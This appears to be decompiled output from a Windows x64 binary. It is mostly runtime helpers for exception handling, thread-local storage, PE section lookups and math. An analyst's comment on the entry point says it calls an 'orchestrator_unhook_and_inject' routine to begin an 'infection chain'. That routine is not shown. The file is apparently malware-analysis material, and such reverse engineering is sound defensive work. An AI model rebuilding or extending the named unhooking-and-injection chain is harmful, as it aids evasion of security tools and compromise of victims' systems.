/* WARNING: Removing unreachable block (ram,0x0001400088c8) */
/* WARNING: Removing unreachable block (ram,0x0001400088d2) */
/* WARNING: Removing unreachable block (ram,0x000140008854) */
/* WARNING: Removing unreachable block (ram,0x00014000886b) */
/* WARNING: Removing unreachable block (ram,0x000140008874) */
/* WARNING: Removing unreachable block (ram,0x000140008887) */
/* WARNING: Removing unreachable block (ram,0x00014000873c) */
/* WARNING: Removing unreachable block (ram,0x0001400086c0) */
/* WARNING: Removing unreachable block (ram,0x0001400086c9) */
/* WARNING: Removing unreachable block (ram,0x0001400086d2) */
/* WARNING: Removing unreachable block (ram,0x0001400088b0) */
/* WARNING: Removing unreachable block (ram,0x0001400088be) */
/* WARNING: Removing unreachable block (ram,0x0001400086e4) */
/* WARNING: Removing unreachable block (ram,0x0001400086f5) */
/* WARNING: Removing unreachable block (ram,0x0001400086fe) */
/* WARNING: Removing unreachable block (ram,0x000140008707) */
/* WARNING: Removing unreachable block (ram,0x0001400087a0) */
/* WARNING: Removing unreachable block (ram,0x0001400088d8) */
/* WARNING: Removing unreachable block (ram,0x0001400088e6) */
/* WARNING: Removing unreachable block (ram,0x0001400087b2) */
/* WARNING: Removing unreachable block (ram,0x0001400087c3) */
/* WARNING: Removing unreachable block (ram,0x0001400087cc) */
/* WARNING: Removing unreachable block (ram,0x0001400087d2) */
/* WARNING: Removing unreachable block (ram,0x0001400087ea) */
/* WARNING: Removing unreachable block (ram,0x00014000873e) */
/* WARNING: Removing unreachable block (ram,0x000140008922) */
/* WARNING: Removing unreachable block (ram,0x000140008930) */
/* WARNING: Removing unreachable block (ram,0x000140008954) */
/* WARNING: Removing unreachable block (ram,0x000140008979) */
/* WARNING: Removing unreachable block (ram,0x000140008747) */
/* WARNING: Removing unreachable block (ram,0x00014000875e) */
/* WARNING: Removing unreachable block (ram,0x000140008763) */
/* WARNING: Removing unreachable block (ram,0x000140008780) */
/* WARNING: Removing unreachable block (ram,0x000140008788) */
/* WARNING: Removing unreachable block (ram,0x000140008796) */
/* WARNING: Removing unreachable block (ram,0x0001400088a0) */
/* WARNING: Removing unreachable block (ram,0x000140008712) */
/* WARNING: Removing unreachable block (ram,0x0001400088f0) */
/* WARNING: Removing unreachable block (ram,0x0001400088f9) */
/* WARNING: Removing unreachable block (ram,0x000140008900) */
/* WARNING: Removing unreachable block (ram,0x00014000891d) */
/* WARNING: Removing unreachable block (ram,0x0001400087f0) */
/* WARNING: Removing unreachable block (ram,0x0001400087fe) */
/* WARNING: Removing unreachable block (ram,0x000140008810) */
/* WARNING: Removing unreachable block (ram,0x000140008822) */
/* WARNING: Removing unreachable block (ram,0x00014000882f) */
/* WARNING: Removing unreachable block (ram,0x000140008840) */

void FUN_1400085e0(undefined8 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4)

{
  ulonglong uVar1;
  undefined1 auStack_58 [24];
  
  if (DAT_14002f130 == 0) {
    DAT_14002f130 = 1;
    FUN_140008f60();
    uVar1 = FUN_1400091c0();
    DAT_14002f134 = 0;
    DAT_14002f138 = auStack_58 + -uVar1;
  }
  return;
}



/* FUN_140008940 @ 140008940 */

void FUN_140008940(undefined4 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4,
                  undefined8 param_5)

{
  undefined4 local_38 [2];
  undefined8 local_30;
  undefined8 local_28;
  undefined8 uStack_20;
  undefined8 local_18;
  
  if (DAT_14002f140 != (code *)0x0) {
    local_18 = param_5;
    local_38[0] = param_1;
    local_30 = param_2;
    local_28 = param_3;
    uStack_20 = param_4;
    (*DAT_14002f140)(local_38);
  }
  return;
}



/* FUN_140008980 @ 140008980 */

void FUN_140008980(undefined8 param_1)

{
  DAT_14002f140 = param_1;
  __setusermatherr();
  return;
}



/* FUN_140008990 @ 140008990 */

undefined8 FUN_140008990(undefined8 *param_1)

{
  uint uVar1;
  code *extraout_RAX;
  code *pcVar2;
  undefined8 uVar3;
  code *extraout_RAX_00;
  code *extraout_RAX_01;
  code *extraout_RAX_02;
  
  uVar1 = *(uint *)*param_1;
  if (((uVar1 & 0x20ffffff) == 0x20474343) && ((((uint *)*param_1)[1] & 1) == 0)) {
    return 0xffffffff;
  }
  if (0xc0000096 < uVar1) goto LAB_1400089ff;
  if (uVar1 < 0xc000008c) {
    if (uVar1 == 0xc0000005) {
      signal(0xb);
      if (extraout_RAX_02 == (code *)0x1) {
        signal(0xb);
        return 0xffffffff;
      }
      if (extraout_RAX_02 != (code *)0x0) {
        (*extraout_RAX_02)(0xb);
        return 0xffffffff;
      }
      goto LAB_1400089ff;
    }
    if (uVar1 < 0xc0000006) {
      if (uVar1 == 0x80000002) {
        return 0xffffffff;
      }
      goto LAB_1400089ff;
    }
    if (uVar1 == 0xc0000008) {
      return 0xffffffff;
    }
    if (uVar1 != 0xc000001d) goto LAB_1400089ff;
switchD_1400089db_caseD_c0000096:
    signal(4);
    if (extraout_RAX_00 == (code *)0x1) {
      signal(4);
    }
    else {
      if (extraout_RAX_00 == (code *)0x0) goto LAB_1400089ff;
      (*extraout_RAX_00)(4);
    }
  }
  else {
    switch(uVar1) {
    case 0xc000008d:
    case 0xc000008e:
    case 0xc000008f:
    case 0xc0000090:
    case 0xc0000091:
    case 0xc0000093:
      signal(8);
      pcVar2 = extraout_RAX;
      if (extraout_RAX == (code *)0x1) {
        signal(8);
        FUN_1400083f0();
        return 0xffffffff;
      }
      break;
    default:
      goto switchD_1400089db_caseD_c0000092;
    case 0xc0000094:
      signal(8);
      pcVar2 = extraout_RAX_01;
      if (extraout_RAX_01 == (code *)0x1) {
        signal(8);
        return 0xffffffff;
      }
      break;
    case 0xc0000096:
      goto switchD_1400089db_caseD_c0000096;
    }
    if (pcVar2 == (code *)0x0) {
LAB_1400089ff:
      if (DAT_14002f160 != (code *)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000140008a13. Too many branches */
                    /* WARNING: Treating indirect jump as call */
        uVar3 = (*DAT_14002f160)(param_1);
        return uVar3;
      }
      return 0;
    }
    (*pcVar2)(8);
  }
switchD_1400089db_caseD_c0000092:
  return 0xffffffff;
}



/* FUN_140008b50 @ 140008b50 */

void FUN_140008b50(void)

{
  DWORD *pDVar1;
  DWORD DVar2;
  LPVOID pvVar3;
  
  EnterCriticalSection((LPCRITICAL_SECTION)&DAT_14002f1a0);
  for (pDVar1 = DAT_14002f180; pDVar1 != (DWORD *)0x0; pDVar1 = *(DWORD **)(pDVar1 + 4)) {
    pvVar3 = TlsGetValue(*pDVar1);
    DVar2 = GetLastError();
    if ((pvVar3 != (LPVOID)0x0) && (DVar2 == 0)) {
      (**(code **)(pDVar1 + 2))(pvVar3);
    }
  }
                    /* WARNING: Could not recover jumptable at 0x000140008bb9. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  LeaveCriticalSection((LPCRITICAL_SECTION)&DAT_14002f1a0);
  return;
}



/* FUN_140008bc0 @ 140008bc0 */

undefined8 FUN_140008bc0(undefined4 param_1,undefined8 param_2)

{
  undefined4 *puVar1;
  
  if (DAT_14002f188 != 0) {
    puVar1 = (undefined4 *)calloc(1,0x18);
    if (puVar1 == (undefined4 *)0x0) {
      return 0xffffffff;
    }
    *(undefined8 *)(puVar1 + 2) = param_2;
    *puVar1 = param_1;
    EnterCriticalSection((LPCRITICAL_SECTION)&DAT_14002f1a0);
    *(undefined4 **)(puVar1 + 4) = DAT_14002f180;
    DAT_14002f180 = puVar1;
    LeaveCriticalSection((LPCRITICAL_SECTION)&DAT_14002f1a0);
  }
  return 0;
}



/* FUN_140008c30 @ 140008c30 */

undefined8 FUN_140008c30(int param_1)

{
  int *piVar1;
  int *_Memory;
  int *piVar2;
  
  if (DAT_14002f188 == 0) {
    return 0;
  }
  EnterCriticalSection((LPCRITICAL_SECTION)&DAT_14002f1a0);
  if (DAT_14002f180 != (int *)0x0) {
    piVar1 = DAT_14002f180;
    piVar2 = (int *)0x0;
    do {
      _Memory = piVar1;
      piVar1 = *(int **)(_Memory + 4);
      if (*_Memory == param_1) {
        if (piVar2 != (int *)0x0) {
          *(int **)(piVar2 + 4) = piVar1;
          piVar1 = DAT_14002f180;
        }
        DAT_14002f180 = piVar1;
        free(_Memory);
        break;
      }
      piVar2 = _Memory;
    } while (piVar1 != (int *)0x0);
  }
  LeaveCriticalSection((LPCRITICAL_SECTION)&DAT_14002f1a0);
  return 0;
}



/* FUN_140008cc0 @ 140008cc0 */

undefined8 FUN_140008cc0(undefined8 param_1,uint param_2)

{
  void *pvVar1;
  void *_Memory;
  
  if (param_2 == 2) {
    FUN_1400083f0();
    return 1;
  }
  if (param_2 < 3) {
    if (param_2 == 0) {
      if (DAT_14002f188 != 0) {
        FUN_140008b50();
      }
      if (DAT_14002f188 == 1) {
        DAT_14002f188 = 1;
        _Memory = DAT_14002f180;
        while (_Memory != (void *)0x0) {
          pvVar1 = *(void **)((longlong)_Memory + 0x10);
          free(_Memory);
          _Memory = pvVar1;
        }
        DAT_14002f180 = (void *)0x0;
        DAT_14002f188 = 0;
        DeleteCriticalSection((LPCRITICAL_SECTION)&DAT_14002f1a0);
      }
    }
    else {
      if (DAT_14002f188 == 0) {
        InitializeCriticalSection((LPCRITICAL_SECTION)&DAT_14002f1a0);
      }
      DAT_14002f188 = 1;
    }
  }
  else if ((param_2 == 3) && (DAT_14002f188 != 0)) {
    FUN_140008b50();
  }
  return 1;
}



/* FUN_140008dc0 @ 140008dc0 */

bool FUN_140008dc0(short *param_1)

{
  if ((*param_1 == 0x5a4d) &&
     (*(int *)((longlong)param_1 + (longlong)*(int *)(param_1 + 0x1e)) == 0x4550)) {
    return (short)((int *)((longlong)param_1 + (longlong)*(int *)(param_1 + 0x1e)))[6] == 0x20b;
  }
  return false;
}



/* FUN_140008df0 @ 140008df0 */

longlong FUN_140008df0(longlong param_1,ulonglong param_2)

{
  longlong lVar1;
  longlong lVar2;
  longlong lVar3;
  
  lVar3 = param_1 + *(int *)(param_1 + 0x3c);
  lVar2 = lVar3 + 0x18 + (ulonglong)*(ushort *)(lVar3 + 0x14);
  if (*(ushort *)(lVar3 + 6) != 0) {
    lVar1 = lVar2 + 0x28;
    do {
      if ((*(uint *)(lVar2 + 0xc) <= param_2) &&
         (param_2 < *(uint *)(lVar2 + 0xc) + *(int *)(lVar2 + 8))) {
        return lVar2;
      }
      lVar2 = lVar2 + 0x28;
    } while (lVar2 != lVar1 + (ulonglong)(*(ushort *)(lVar3 + 6) - 1) * 0x28);
  }
  return 0;
}



/* FUN_140008e40 @ 140008e40 */

/* WARNING: Enum "SectionFlags": Some values do not have unique names */

IMAGE_SECTION_HEADER * FUN_140008e40(char *param_1)

{
  int iVar1;
  size_t sVar2;
  IMAGE_SECTION_HEADER *_Str1;
  
  sVar2 = strlen(param_1);
  if (sVar2 < 9) {
    _Str1 = &IMAGE_SECTION_HEADER_140000188;
    do {
      iVar1 = strncmp(_Str1->Name,param_1,8);
      if (iVar1 == 0) {
        return _Str1;
      }
      _Str1 = _Str1 + 1;
    } while (_Str1 != (IMAGE_SECTION_HEADER *)&DAT_1400002f0);
  }
  return (IMAGE_SECTION_HEADER *)0x0;
}



/* FUN_140008ee0 @ 140008ee0 */

/* WARNING: Enum "SectionFlags": Some values do not have unique names */

IMAGE_SECTION_HEADER * FUN_140008ee0(longlong param_1)

{
  IMAGE_SECTION_HEADER *pIVar1;
  
  pIVar1 = &IMAGE_SECTION_HEADER_140000188;
  while ((param_1 - 0x140000000U < (ulonglong)(uint)pIVar1->VirtualAddress ||
         ((ulonglong)(pIVar1->VirtualAddress + (pIVar1->Misc).PhysicalAddress) <=
          param_1 - 0x140000000U))) {
    pIVar1 = pIVar1 + 1;
    if (pIVar1 == (IMAGE_SECTION_HEADER *)&DAT_1400002f0) {
      return (IMAGE_SECTION_HEADER *)0x0;
    }
  }
  return pIVar1;
}



/* FUN_140008f60 @ 140008f60 */

/* WARNING: Removing unreachable block (ram,0x000140008f7f) */

word FUN_140008f60(void)

{
  return 9;
}



/* FUN_140008fa0 @ 140008fa0 */

/* WARNING: Enum "SectionFlags": Some values do not have unique names */

IMAGE_SECTION_HEADER * FUN_140008fa0(longlong param_1)

{
  IMAGE_SECTION_HEADER *pIVar1;
  
  pIVar1 = &IMAGE_SECTION_HEADER_140000188;
  do {
    if ((pIVar1->Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0) {
      if (param_1 == 0) {
        return pIVar1;
      }
      param_1 = param_1 + -1;
    }
    pIVar1 = pIVar1 + 1;
  } while (pIVar1 != (IMAGE_SECTION_HEADER *)&DAT_1400002f0);
  return (IMAGE_SECTION_HEADER *)0x0;
}



/* FUN_140009020 @ 140009020 */

/* WARNING: Removing unreachable block (ram,0x00014000903f) */

IMAGE_DOS_HEADER * FUN_140009020(void)

{
  return &IMAGE_DOS_HEADER_140000000;
}



/* FUN_140009060 @ 140009060 */

/* WARNING: Removing unreachable block (ram,0x000140009080) */
/* WARNING: Enum "SectionFlags": Some values do not have unique names */

uint FUN_140009060(longlong param_1)

{
  IMAGE_SECTION_HEADER *pIVar1;
  
  pIVar1 = &IMAGE_SECTION_HEADER_140000188;
  while ((param_1 - 0x140000000U < (ulonglong)(uint)pIVar1->VirtualAddress ||
         ((ulonglong)(pIVar1->VirtualAddress + (pIVar1->Misc).PhysicalAddress) <=
          param_1 - 0x140000000U))) {
    pIVar1 = pIVar1 + 1;
    if (pIVar1 == (IMAGE_SECTION_HEADER *)&DAT_1400002f0) {
      return 0;
    }
  }
  return ~pIVar1->Characteristics >> 0x1f;
}



/* FUN_1400090f0 @ 1400090f0 */

/* WARNING: Removing unreachable block (ram,0x000140009112) */
/* WARNING: Enum "SectionFlags": Some values do not have unique names */

char * FUN_1400090f0(int param_1)

{
  dword *pdVar1;
  IMAGE_SECTION_HEADER *pIVar2;
  
  pIVar2 = &IMAGE_SECTION_HEADER_140000188;
  while ((0x30000 < (uint)pIVar2->VirtualAddress ||
         (pIVar2->VirtualAddress + (pIVar2->Misc).PhysicalAddress < 0x30001))) {
    pIVar2 = pIVar2 + 1;
    if (pIVar2 == (IMAGE_SECTION_HEADER *)&DAT_1400002f0) {
      return (char *)0x0;
    }
  }
  for (pdVar1 = &DWORD_140030000; (pdVar1[1] != 0 || (pdVar1[3] != 0)); pdVar1 = pdVar1 + 5) {
    if (param_1 < 1) {
      return IMAGE_DOS_HEADER_140000000.e_magic + pdVar1[3];
    }
    param_1 = param_1 + -1;
  }
  return (char *)0x0;
}



/* FUN_1400091c0 @ 1400091c0 */

ulonglong FUN_1400091c0(void)

{
  ulonglong in_RAX;
  ulonglong uVar1;
  undefined8 *puVar2;
  undefined8 local_res8 [4];
  
  puVar2 = local_res8;
  uVar1 = in_RAX;
  if (0xfff < in_RAX) {
    do {
      puVar2 = puVar2 + -0x200;
      *puVar2 = *puVar2;
      uVar1 = uVar1 - 0x1000;
    } while (0x1000 < uVar1);
  }
  *(undefined8 *)((longlong)puVar2 - uVar1) = *(undefined8 *)((longlong)puVar2 - uVar1);
  return in_RAX;
}



/* FUN_140009200 @ 140009200 */

void FUN_140009200(longlong *param_1)

{
  longlong lVar1;
  longlong lVar2;
  
  lVar1 = *param_1;
  if (lVar1 != 0) {
    lVar2 = 0;
    do {
      if (param_1[lVar2 + 1] != 0) {
        free(*(void **)(param_1[lVar2 + 1] + -8));
      }
      lVar2 = lVar2 + 1;
    } while (lVar1 != lVar2);
  }
  free(param_1);
  return;
}



/* FUN_140009250 @ 140009250 */

void * FUN_140009250(size_t *param_1)

{
  ulonglong uVar1;
  size_t _Size;
  void *pvVar2;
  void *pvVar3;
  
  uVar1 = param_1[1];
  _Size = *param_1;
  if (uVar1 < 9) {
    pvVar2 = malloc(_Size + 8);
    if (pvVar2 == (void *)0x0) {
LAB_1400092e2:
                    /* WARNING: Subroutine does not return */
      abort();
    }
    pvVar3 = (void *)param_1[3];
    *(void **)pvVar2 = pvVar2;
    pvVar2 = (void *)((longlong)pvVar2 + 8);
  }
  else {
    pvVar3 = malloc(uVar1 + 7 + _Size);
    if (pvVar3 == (void *)0x0) goto LAB_1400092e2;
    pvVar2 = (void *)((longlong)pvVar3 + uVar1 + 7 & -uVar1);
    *(void **)((longlong)pvVar2 + -8) = pvVar3;
    pvVar3 = (void *)param_1[3];
  }
  if (pvVar3 != (void *)0x0) {
    pvVar3 = memcpy(pvVar2,pvVar3,_Size);
    return pvVar3;
  }
  pvVar3 = memset(pvVar2,0,_Size);
  return pvVar3;
}



/* FUN_1400092f0 @ 1400092f0 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_1400092f0(size_t *param_1)

{
  ulonglong uVar1;
  DWORD dwErrCode;
  BOOL BVar2;
  DWORD DVar3;
  ulonglong *_Memory;
  void *pvVar4;
  undefined8 uVar5;
  ulonglong uVar6;
  size_t sVar7;
  
  if (g_tls_state == 0) {
    if (param_1[2] != 0) {
      return;
    }
    pvVar4 = FUN_140009250(param_1);
    param_1[2] = (size_t)pvVar4;
    return;
  }
  sVar7 = param_1[2];
  if (sVar7 == 0) {
    if (g_tls_state == 0) {
LAB_1400094d1:
      sVar7 = param_1[2];
      if (sVar7 == 0) goto LAB_1400094de;
    }
    else {
      if (DAT_14002a700 == 0) {
        LOCK();
        _DAT_14002a704 = _DAT_14002a704 + 1;
        UNLOCK();
        if (_DAT_14002a704 == 0) {
          InitializeCriticalSection((LPCRITICAL_SECTION)&DAT_14002f240);
          DVar3 = TlsAlloc();
          if (DVar3 == 0xffffffff) {
            DVar3 = GetLastError();
          }
          else {
            DAT_14002f228 = DVar3;
            uVar5 = FUN_140009da0(DVar3,0x140009200);
            DVar3 = (DWORD)uVar5;
          }
          if (DVar3 != 0) goto LAB_140009537;
          DAT_14002a700 = 1;
        }
        else {
          do {
            Sleep(0);
          } while (DAT_14002a700 == 0);
        }
        if (g_tls_state == 0) goto LAB_1400094d1;
      }
      EnterCriticalSection((LPCRITICAL_SECTION)&DAT_14002f240);
      sVar7 = param_1[2];
      if (sVar7 == 0) {
LAB_1400094de:
        sVar7 = DAT_14002f220 + 1;
        DAT_14002f220 = sVar7;
        param_1[2] = sVar7;
      }
      if (g_tls_state != 0) {
        LeaveCriticalSection((LPCRITICAL_SECTION)&DAT_14002f240);
      }
    }
  }
  DVar3 = DAT_14002f228;
  dwErrCode = GetLastError();
  _Memory = (ulonglong *)TlsGetValue(DVar3);
  SetLastError(dwErrCode);
  if (_Memory == (ulonglong *)0x0) {
    _Memory = (ulonglong *)calloc(sVar7 + 0x21,8);
    if (_Memory == (ulonglong *)0x0) {
LAB_140009537:
                    /* WARNING: Subroutine does not return */
      abort();
    }
    *_Memory = sVar7 + 0x20;
  }
  else {
    uVar1 = *_Memory;
    if (sVar7 <= uVar1) goto LAB_14000936b;
    uVar6 = uVar1 * 2;
    if (uVar1 * 2 < sVar7) {
      uVar6 = sVar7 + 0x20;
    }
    _Memory = (ulonglong *)realloc(_Memory,uVar6 * 8 + 8);
    if (_Memory == (ulonglong *)0x0) goto LAB_140009537;
    *_Memory = uVar6;
    memset(_Memory + uVar1 + 1,0,(uVar6 - uVar1) * 8);
  }
  BVar2 = TlsSetValue(DAT_14002f228,_Memory);
  if (BVar2 == 0) {
    GetLastError();
  }
LAB_14000936b:
  if (_Memory[sVar7] == 0) {
    pvVar4 = FUN_140009250(param_1);
    _Memory[sVar7] = (ulonglong)pvVar4;
  }
  return;
}



/* FUN_140009570 @ 140009570 */

undefined * FUN_140009570(void)

{
  return _fmode_exref;
}



/* FUN_140009580 @ 140009580 */

undefined * FUN_140009580(void)

{
  return _commode_exref;
}



/* FUN_140009590 @ 140009590 */

undefined * FUN_140009590(void)

{
  return _acmdln_exref;
}



/* FUN_1400095a0 @ 1400095a0 */

undefined8 FUN_1400095a0(void)

{
  return DAT_14002f280;
}



/* FUN_1400095b0 @ 1400095b0 */

undefined8 FUN_1400095b0(undefined8 param_1)

{
  undefined8 uVar1;
  
  uVar1 = DAT_14002f280;
  LOCK();
  DAT_14002f280 = param_1;
  UNLOCK();
  return uVar1;
}



/* FUN_1400095c0 @ 1400095c0 */

double FUN_1400095c0(undefined8 param_1,double *param_2)

{
  double dVar1;
  undefined1 in_XMM0 [16];
  
  dVar1 = ROUND(in_XMM0._0_8_);
  *param_2 = dVar1;
  if ((((in_XMM0 & (undefined1  [16])0xfffff00000000) == (undefined1  [16])0x0 && in_XMM0._0_4_ == 0
       ) && (in_XMM0._4_4_ & 0x7ff00000) == 0x7ff00000) &&
     (((in_XMM0 & (undefined1  [16])0xfffff00000000) != (undefined1  [16])0x0 || in_XMM0._0_4_ != 0)
      || (in_XMM0 & (undefined1  [16])0x7ff0000000000000) != (undefined1  [16])0x0)) {
    return 0.0;
  }
  return in_XMM0._0_8_ - dVar1;
}



/* FUN_140009be0 @ 140009be0 */

FILE * FUN_140009be0(uint param_1)

{
  FILE *pFVar1;
  
  pFVar1 = __iob_func();
  return pFVar1 + param_1;
}



/* FUN_140009da0 @ 140009da0 */

undefined8 FUN_140009da0(undefined4 param_1,longlong param_2)

{
  undefined8 uVar1;
  
  if (param_2 == 0) {
    return 0;
  }
  uVar1 = FUN_140008bc0(param_1,param_2);
  return uVar1;
}



/* FUN_140009dc0 @ 140009dc0 */

double FUN_140009dc0(double param_1,uint param_2)

{
  bool bVar1;
  uint uVar2;
  int *piVar3;
  byte bVar4;
  uint uVar5;
  uint uVar6;
  bool bVar7;
  double dVar8;
  double dVar9;
  double dVar10;
  undefined1 auVar11 [16];
  
  uVar5 = (uint)((ulonglong)param_1 >> 0x20);
  bVar1 = param_1 == 1.0;
  bVar7 = param_2 == 0;
  if ((((ulonglong)param_1 & 0xfffff00000000) == 0 && SUB84(param_1,0) == 0) &&
      ((ulonglong)param_1 & 0x7ff0000000000000) == 0) {
    if (bVar1 || bVar7) {
      return 1.0;
    }
    if ((int)param_2 < 0) {
      if ((param_2 & 1) == 0) {
        return INFINITY;
      }
      if (uVar5 == 0) {
        return INFINITY;
      }
      return -INFINITY;
    }
    if ((param_2 & 1) == 0) {
      return 0.0;
    }
    if (uVar5 == 0) {
      return 0.0;
    }
    return -0.0;
  }
  if ((((ulonglong)param_1 & 0x7ff0000000000000) != 0) && ((uVar5 & 0x7ff00000) == 0x7ff00000)) {
    if (((ulonglong)param_1 & 0xfffff00000000) != 0 || SUB84(param_1,0) != 0) {
      if (bVar1 || bVar7) {
        return 1.0;
      }
      dVar10 = NAN;
      if ((longlong)param_1 < 0) {
        dVar10 = -NAN;
      }
      piVar3 = _errno();
      *piVar3 = 0x21;
      FUN_140008940(1,"__powi",param_1,(double)(int)param_2,dVar10);
      return dVar10;
    }
    if (bVar1 || bVar7) {
      return 1.0;
    }
    if ((longlong)param_1 < 0) {
      uVar5 = param_2 & 1;
      bVar4 = (byte)uVar5 ^ 1;
      if (((int)param_2 < 0) && (bVar4 != 0)) {
        return 0.0;
      }
      if (((param_2 & 1) != 0) && (-1 < (int)param_2)) {
        return -INFINITY;
      }
      if ((bVar4 != 0) && (-1 < (int)param_2)) {
        return INFINITY;
      }
      if ((int)param_2 < 0) {
        if (uVar5 != 0) {
          return -0.0;
        }
        return 0.0;
      }
      if (uVar5 != 0) {
        return -INFINITY;
      }
    }
    else if ((int)param_2 < 0) {
      return 0.0;
    }
    return INFINITY;
  }
  if (bVar1 || bVar7) {
    return 1.0;
  }
  dVar8 = ABS(param_1);
  uVar5 = param_2 & 1;
  dVar10 = dVar8;
  if ((int)param_2 < 0) {
    if (param_2 != 0xffffffff) {
      param_2 = -param_2;
      bVar1 = true;
      goto LAB_140009e65;
    }
  }
  else {
    if (param_2 == 1) goto LAB_140009f08;
    bVar1 = false;
LAB_140009e65:
    auVar11 = ZEXT816(0x3ff0000000000000);
    if (uVar5 != 0) {
      auVar11._8_8_ = 0;
      auVar11._0_8_ = dVar8;
    }
    uVar6 = param_2 >> 1;
    dVar9 = param_1;
    uVar2 = uVar6;
    do {
      dVar9 = dVar9 * dVar9;
      if ((uVar2 & 1) != 0) {
        auVar11._0_8_ = auVar11._0_8_ * dVar9;
      }
      dVar10 = auVar11._0_8_;
      uVar2 = uVar2 >> 1;
    } while (uVar2 != 0);
    if (!bVar1) goto LAB_140009f08;
    if ((((((auVar11 & (undefined1  [16])0xfffff00000000) != (undefined1  [16])0x0 ||
           auVar11._0_4_ != 0) ||
          (auVar11 & (undefined1  [16])0x7ff0000000000000) != (undefined1  [16])0x0) &&
          (auVar11._4_4_ & 0x7ff00000) == 0x7ff00000) &&
        ((auVar11 & (undefined1  [16])0xfffff00000000) == (undefined1  [16])0x0 &&
         auVar11._0_4_ == 0)) && (1.0 < dVar8)) {
      dVar8 = 1.0 / dVar8;
      dVar10 = 1.0;
      if (uVar5 != 0) {
        dVar10 = dVar8;
      }
      do {
        dVar8 = dVar8 * dVar8;
        if ((uVar6 & 1) != 0) {
          dVar10 = dVar10 * dVar8;
        }
        uVar6 = uVar6 >> 1;
      } while (uVar6 != 0);
      goto LAB_140009f08;
    }
  }
  dVar10 = 1.0 / dVar10;
LAB_140009f08:
  if (((longlong)param_1 < 0) && (uVar5 != 0)) {
    dVar10 = -dVar10;
  }
  return dVar10;
}



/* math_exp2 @ 14000a0f0 */

float10 * math_exp2(float10 *param_1,float10 *param_2)

{
  float10 fVar1;
  float10 fVar2;
  
  fVar2 = *param_2;
  fVar1 = (float10)0;
  if ((byte)(NAN(fVar2) | (byte)((ushort)((ushort)(fVar2 != fVar1) << 10) >> 8) |
            (byte)((ushort)((ushort)(fVar2 == fVar1) << 0xe) >> 8)) != 5) {
    fVar1 = (float10)f2xm1(fVar2 - ROUND(fVar2));
    fVar2 = (float10)fscale((float10)1 + fVar1,ROUND(fVar2));
    *(undefined8 *)((longlong)param_1 + 8) = 0;
    *param_1 = fVar2;
    return param_1;
  }
  if (fVar2 < fVar1) {
    fVar2 = (float10)0;
  }
  *(undefined8 *)((longlong)param_1 + 8) = 0;
  *param_1 = fVar2;
  return param_1;
}



/* math_ldexp @ 14000a160 */

double math_ldexp(undefined8 param_1,int param_2)

{
  int *piVar1;
  double dVar2;
  float10 fVar3;
  undefined1 in_XMM0 [16];
  
  dVar2 = in_XMM0._0_8_;
  if ((((in_XMM0 & (undefined1  [16])0x7fffffff00000000) == (undefined1  [16])0x0 &&
        in_XMM0._0_4_ == 0 ||
        (in_XMM0 & (undefined1  [16])0x7ff0000000000000) == (undefined1  [16])0x0) ||
      ((in_XMM0._4_4_ & 0x7ff00000) != 0x7ff00000)) && (dVar2 != 0.0)) {
    fVar3 = (float10)fscale((float10)dVar2,(float10)param_2);
    dVar2 = (double)fVar3;
    if ((((((ulonglong)dVar2 & 0x7fffffff00000000) != 0 || SUB84(dVar2,0) != 0) &&
          ((ulonglong)dVar2 & 0x7ff0000000000000) != 0) &&
        (((uint)((ulonglong)dVar2 >> 0x20) & 0x7ff00000) == 0x7ff00000)) || (dVar2 == 0.0)) {
      piVar1 = _errno();
      *piVar1 = 0x22;
    }
  }
  return dVar2;
}



/* math_log2 @ 14000a240 */

float10 * math_log2(float10 *param_1,float10 *param_2)

{
  float10 fVar1;
  float10 fVar2;
  
  fVar2 = (float10)1.0;
  fVar1 = *param_2;
  if ((NAN(fVar1)) && (fVar1 == (float10)0)) {
    *(undefined8 *)((longlong)param_1 + 8) = 0;
    *param_1 = fVar1;
    return param_1;
  }
  if (ABS(fVar1 - fVar2) <= (float10)0.29) {
    *(undefined8 *)((longlong)param_1 + 8) = 0;
    *param_1 = fVar2 * ((fVar1 - fVar2) + (float10)1);
    return param_1;
  }
  *(undefined8 *)((longlong)param_1 + 8) = 0;
  *param_1 = fVar2 * fVar1;
  return param_1;
}



/*
 * main_entry @ 14000a2a0
 *
 * Program entry point. Parses command line, calls GetStartupInfoA,
 * then invokes orchestrator_unhook_and_inject to begin the infection chain.
 */

void main_entry(void)

{
  char *pcVar1;
  char cVar2;
  int iVar3;
  undefined8 *puVar4;
  longlong lVar5;
  char *pcVar6;
  bool bVar7;
  LPSTARTUPINFOA p_Var8;
  _STARTUPINFOA local_88;
  
  bVar7 = false;
  crt_init_console();
  puVar4 = (undefined8 *)FUN_140009590();
  pcVar6 = (char *)*puVar4;
  if (pcVar6 != (char *)0x0) {
    do {
      cVar2 = *pcVar6;
      if (cVar2 < '!') {
        if (cVar2 == '\0') break;
        if (!bVar7) goto LAB_14000a300;
        bVar7 = true;
      }
      else if (cVar2 == '\"') {
        bVar7 = (bool)(bVar7 ^ 1);
      }
      iVar3 = _ismbblead((int)cVar2);
      if (iVar3 != 0) {
        pcVar6 = pcVar6 + (pcVar6[1] != '\0');
      }
      pcVar6 = pcVar6 + 1;
    } while( true );
  }
  goto LAB_14000a318;
LAB_14000a300:
  if (cVar2 != '\0') {
    do {
      pcVar1 = pcVar6 + 1;
      pcVar6 = pcVar6 + 1;
      if (*pcVar1 == '\0') break;
    } while (*pcVar1 < '!');
  }
LAB_14000a318:
  p_Var8 = &local_88;
  for (lVar5 = 0xd; lVar5 != 0; lVar5 = lVar5 + -1) {
    *(undefined8 *)p_Var8 = 0;
    p_Var8 = (LPSTARTUPINFOA)&p_Var8->lpReserved;
  }
  GetStartupInfoA(&local_88);
  orchestrator_unhook_and_inject();
  return;
}



